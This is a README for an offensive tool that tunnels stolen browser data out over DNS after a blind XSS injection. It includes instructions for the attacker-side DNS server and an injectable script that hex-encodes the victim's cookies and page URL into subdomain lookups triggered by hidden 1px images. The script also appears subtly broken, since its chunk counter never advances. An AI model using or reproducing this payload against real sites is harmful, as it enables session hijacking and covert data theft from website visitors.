# Data-Over-DNS
This tool can be used for tunnelling data over DNS from webpage when the below website code has been injected as part of a BlindXSS attack.

To use this tool you will need a domain name and be able to update DNS records. 
You will need to create a subdomain domain NS record pointing to your own computer or cloud instance.

#DNS Server

Run the dns server with "sudo node DoDNS.js"
//sudo is required to bind to port 53


#Website Code

    <script>
        function dataoOverDNS( domain, file, data ){
            //domain = Your subdomain which is hosting the DoDNS.js node
            //file = A random file name you want built inside the image element
            //data = the data object which is to be transported over DNS
            
            //random_str = create a random string to differentiate between requests.
            var random_str = Math.random().toString(36).substring(2, 6) + Math.random().toString(36).substring(2, 6);
            //convert object to JSON
            var data = JSON.stringify( data );
            var hexstr = "";
            //convert JSON object byte by byte into a hex string
            for (var i = 0; i < data.length; i++) { hexstr += data.charCodeAt(i).toString(16).padStart(2, '0'); }
            //split hex string into 62 byte chunks inside subdomains
            hexstr_sp = hexstr.match(/.{1,62}/g);
            var packets = Math.ceil( hexstr_sp.length / 3 );
            var packet = 0;
            //split hexstring into seperate packets to avoid hitting max length
            for (var i = 0; i < packets; i++) {
                subs = [];
                //fill subdomains with data
                for( i2=0;i2<3;i2++) { subs.push(  (hexstr_sp.hasOwnProperty(packet)) ? hexstr_sp[packet] : "00" ); }
                //create image element to add to webpage to force the victim computer to make a DNS Request
                var oImg = document.createElement("img");
                oImg.setAttribute('src', "https://" + subs[0] + "." + subs[1] + "." + subs[2] + "." + ( i + 1 ).toString(16).padStart(4, '0') + packets.toString(16).padStart(4, '0') + "." + random_str + "." + domain + "/" + file );
                oImg.setAttribute('height', '1px');
                oImg.setAttribute('width', '1px');
                document.body.appendChild(oImg);
            }
        }
        dataoOverDNS('ns.yourdomain.com','randomfile.jpg', { "location" : window.location.href, "cookie" : document.cookie } );
    </script>


